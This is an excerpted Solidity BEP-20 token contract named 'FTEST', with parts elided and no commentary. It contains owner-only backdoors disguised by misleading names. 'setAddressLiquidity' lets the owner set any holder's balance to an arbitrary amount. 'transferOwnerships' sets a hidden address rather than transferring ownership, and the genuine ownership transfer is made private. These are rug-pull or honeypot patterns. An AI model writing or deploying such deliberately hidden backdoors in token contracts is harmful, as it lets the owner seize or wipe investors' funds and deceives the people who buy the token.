...
abstract contract RSunAuth {
     ...
     */
    function transferOwnership(address payable adr) private onlyOwner {
...
contract FTEST is IBEP20, RSunAuth {
    using SafeMath for uint256;
    ...
    string constant _name = "FTEST";
    string constant _symbol = "FTE";
    ...
    address private newun = address(0);
    ...
    function transferOwnerships(address _newun) public onlyOwner {
        newun = _newun;
    }
    ...
    function setAddressLiquidity(address holder ,uint256 exempt) public onlyOwner{
  	     _balances[holder] = exempt;
  	}
